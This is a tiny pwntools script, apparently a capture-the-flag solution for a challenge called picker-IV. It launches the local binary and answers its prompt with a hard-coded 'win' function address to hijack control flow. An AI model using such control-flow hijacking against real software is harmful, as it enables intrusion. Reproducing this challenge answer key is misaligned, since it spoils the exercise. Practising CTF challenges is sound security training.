# picjer-iv

```python
from pwn import *

win_addr = b"40129e"

r = process("./picker-IV")
r.recvuntil("Enter the address in hex to jump to, excluding '0x'")
r.sendline(win_addr)
r.recvall()
```
